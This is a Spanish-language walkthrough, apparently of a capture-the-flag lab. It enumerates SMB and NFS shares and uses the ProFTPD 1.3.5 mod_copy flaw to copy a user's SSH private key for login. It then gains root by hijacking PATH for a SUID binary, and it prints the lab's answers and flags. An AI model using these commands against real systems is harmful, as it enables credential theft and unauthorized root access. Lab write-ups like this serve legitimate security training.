# 1. Implementar la máquina vulnerable
En esta sala se abordará el acceso a un recurso compartido de Samba, la manipulación de una versión vulnerable de proftpd para obtener acceso inicial y escalar sus privilegios a root a través de un binario SUID.

## a) Escanee la máquina con nmap, ¿cuántos puertos están abiertos?

Realizamos un escaneo básico con Nmap, usamos:

```
nmap -sV -T4 10.10.189.6
```

![](IMG/Pasted%20image%2020250407004934.png)

Y encontramos 7 puertos abiertos.

**Respuesta: 7**

# 2. Enumeración de Samba

![](https://i.imgur.com/O8S93Kr.png)

Samba es el paquete estándar de programas de interoperabilidad de Windows para Linux y Unix. Permite a los usuarios finales acceder y utilizar archivos, impresoras y otros recursos compartidos en la intranet o internet de una empresa. Se le suele denominar sistema de archivos de red.

Samba se basa en el protocolo cliente-servidor común, Bloque de Mensajes del Servidor ( SMB ). SMB está desarrollado exclusivamente para Windows; sin Samba, otras plataformas informáticas quedarían aisladas de las máquinas Windows, incluso si formaran parte de la misma red.

Responda las preguntas a continuación

Usando nmap podemos enumerar una máquina para compartir SMB.

Nmap puede automatizar diversas tareas de red. ¡Incluye un script para enumerar recursos compartidos!

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse IP_DE_LA_MÁQUINA

SMB tiene dos puertos, 445 y 139.

![](IMG/Pasted%20image%2020250407005129.png)

## a) Usando el comando nmap anterior, ¿cuántas acciones se han encontrado?

Usamos:

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.189.6
```

![](IMG/Pasted%20image%2020250407005402.png)

Hemos encontrado 3.

**Respuesta: 3**

En la mayoría de las distribuciones de Linux, smbclient ya está instalado. Inspeccionemos uno de los recursos compartidos.

smbclient // IP_DE_MÁQUINA /anonymous

Usando su máquina, conéctese al recurso compartido de red de la máquina.

![](IMG/Pasted%20image%2020250407005539.png)

## b) Una vez conectado, enumera los archivos compartidos. ¿Qué archivo ves?

Usamos:

```
smbclient //10.10.189.6/anonymous
ls
```

![](IMG/Pasted%20image%2020250407005803.png)

Encontramos el archivo log.txt.

**Respuesta: log.txt**

También puedes descargar recursivamente el recurso compartido SMB. Introduce el nombre de usuario y la contraseña como "nada".

smbget -R smb:// IP_DE_MÁQUINA /anonymous

Abra el archivo en el recurso compartido. Se encontraron algunas cosas interesantes.

- Información generada para Kenobi al generar una clave SSH para el usuario
- Información sobre el servidor ProFTPD.

## c) ¿En qué puerto se ejecuta FTP?

Usamos:

```
smbget -R smb://10.10.189.6/anonymous
```

Como no funciona el comando sugerido

![](IMG/Pasted%20image%2020250407010706.png)

Vamos a usar un simple get conectados al servidor samba

```
get log.txt
```

![](IMG/Pasted%20image%2020250407010757.png)

Y ahora, lo abrimos.

![](IMG/Pasted%20image%2020250407010848.png)

Vemos que el puerto del ftp es el 21

**Respuesta: 21**

El escaneo de puertos de nmap anterior mostró el puerto 111 ejecutando el servicio rpcbind. Este es un servidor que convierte el número de programa de llamada a procedimiento remoto (RPC) en direcciones universales. Al iniciar un servicio RPC, le indica a rpcbind la dirección en la que está escuchando y el número de programa RPC que está listo para servir. 

En nuestro caso, el puerto 111 da acceso a un sistema de archivos de red. Usemos nmap para enumerarlo.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP_DE_LA_MÁQUINA

## d) Que montaje podemos ver?

Usamos:

```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.189.6
```

![](IMG/Pasted%20image%2020250407011232.png)

**Respuesta: /var**

# 3. Obtener acceso inicial con Proftpd

![](https://i.imgur.com/L54MBzX.png)

ProFtpd es un servidor FTP gratuito y de código abierto , compatible con sistemas Unix y Windows. También ha sido vulnerable en versiones anteriores del software.

Obtengamos la versión de ProFtpd. Use netcat para conectarse a la máquina en el puerto FTP.

## a) ¿Cual es la version?

Usamos netcat así:

```
nc -v 10.10.189.6 21
```

![](IMG/Pasted%20image%2020250407011639.png)

**Respuesta: 1.3.5**

Podemos utilizar searchsploit para encontrar exploits para una versión particular de software.

Searchsploit es básicamente una herramienta de búsqueda de línea de comandos para exploit-db.com.

## b) ¿Cuántos exploits existen para el ProFTPd en ejecución?

Usamos:

```
searchsploit Proftpd 1.3.5
```

![](IMG/Pasted%20image%2020250407011849.png)

**Respuesta: 4**

Deberías haber encontrado un exploit del módulo mod_copy de ProFtpd . 

El módulo mod_copy implementa los comandos SITE CPFR y SITE CPTO , que permiten copiar archivos/directorios de un lugar a otro en el servidor. Cualquier cliente no autenticado puede usar estos comandos para copiar archivos desde cualquier  parte del sistema de archivos a un destino seleccionado.

Sabemos que el servicio FTP se está ejecutando como el usuario Kenobi (desde el archivo en el recurso compartido) y se genera una clave ssh para ese usuario. 

Ahora vamos a copiar  la clave privada de Kenobi usando los comandos SITE CPFR y SITE CPTO.

![](IMG/Pasted%20image%2020250407011958.png)

Usamos:

```
nc 10.10.189.6
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![](IMG/Pasted%20image%2020250407013926.png)

Sabíamos que el directorio /var era un montaje visible (tarea 2, pregunta 4). Por lo tanto, hemos movido la clave privada de Kenobi al directorio /var/tmp.

Montemos el directorio /var/tmp en nuestra máquina

mkdir /mnt/kenobiNFS
mount IP_DE_LA_MÁQUINA:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS

![](IMG/Pasted%20image%2020250407012102.png)

¡Ya tenemos un montaje de red en nuestra máquina implementada! Podemos ir a /var/tmp, obtener la clave privada y luego iniciar sesión en la cuenta de Kenobi.

![](IMG/Pasted%20image%2020250407012123.png)

## c) ¿Cuál es la bandera de usuario de Kenobi (/home/kenobi/user.txt)?

Montamos el directorio /var/tmp a nuestra máquina, usando:

```
sudo su
mkdir /mnt/kenobiNFS
mount 10.10.189.6:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

![](IMG/Pasted%20image%2020250407012418.png)

Ahora, como en el ejemplo, obtendremos la clave privada e iniciaremos sesión con el usuario kenobi. Usamos:

```
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.189.6
```

![](IMG/Pasted%20image%2020250407014103.png)

Ahora, abrimos la flag

![](IMG/Pasted%20image%2020250407014233.png)

**Respuesta: d0b0f3f53b6caa532a83915e19224899**

# 4. Escalada de privilegios con manipulación de variables de ruta

![](https://i.imgur.com/LN2uOCJ.png)  

Primero entendamos qué son SUID, SGID y Sticky Bits.

|   |   |   |
|---|---|---|
|**Permiso**|**En archivos**|**Sobre directorios**|
|Bit SUID|El usuario ejecuta el archivo con los permisos del propietario del _archivo_|-|
|Bit SGID|El usuario ejecuta el archivo con el permiso del propietario _del grupo_ .|El archivo creado en el directorio obtiene el mismo propietario de grupo.|
|Pegajoso Bit|Sin significado|A los usuarios se les impide eliminar archivos de otros usuarios.|

Los bits SUID pueden ser peligrosos, algunos binarios como passwd necesitan ejecutarse con privilegios elevados (ya que restablece su contraseña en el sistema), sin embargo, otros archivos personalizados que tengan el bit SUID pueden generar todo tipo de problemas.

Para buscar este tipo de archivos en un sistema, ejecute lo siguiente: find / -perm -u=s -type f 2>/dev/null

## a) ¿Qué archivo parece particularmente fuera de lo común?

Usamos:

```
find / -perm -u=s -type f 2>/dev/null
```

![](IMG/Pasted%20image%2020250407014503.png)

**Respuesta: /usr/bin/menu**

## b) Ejecuta el binario, ¿cuántas opciones aparecen?

Usamos:

```
/usr/bin/menu
```

![](IMG/Pasted%20image%2020250407014933.png)

Aparecen 3 opciones

**Respuesta: 3**

Strings es un comando en Linux que busca cadenas legibles por humanos en un binario.

![](IMG/Pasted%20image%2020250407015022.png)

Usamos:

```
strings /usr/bin/menu
```

![](IMG/Pasted%20image%2020250407020135.png)

Esto nos muestra que el binario se está ejecutando sin una ruta completa (por ejemplo, no utiliza /usr/bin/curl o /usr/bin/uname).

Como este archivo se ejecuta con privilegios de usuario root, podemos manipular nuestra ruta para obtener un shell root.

![](IMG/Pasted%20image%2020250407015054.png)

Copiamos el shell /bin/sh, lo llamamos curl, le asignamos los permisos correctos y luego incluimos su ubicación en nuestra ruta. Esto significa que, al ejecutar el binario /usr/bin/menu, se usa nuestra variable de ruta para encontrar el binario "curl". Este es, en realidad, una versión de /usr/sh. Además, al ejecutar este archivo como root, también ejecuta nuestro shell como root.

## c) ¿Cual es la flag de root.txt (/root/root.txt)?

Usamos:

```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

![](IMG/Pasted%20image%2020250407015639.png)

Y abrimos la flag

![](IMG/Pasted%20image%2020250407015909.png)

**Respuesta: 177b3cd8562289f37382721c28381f02**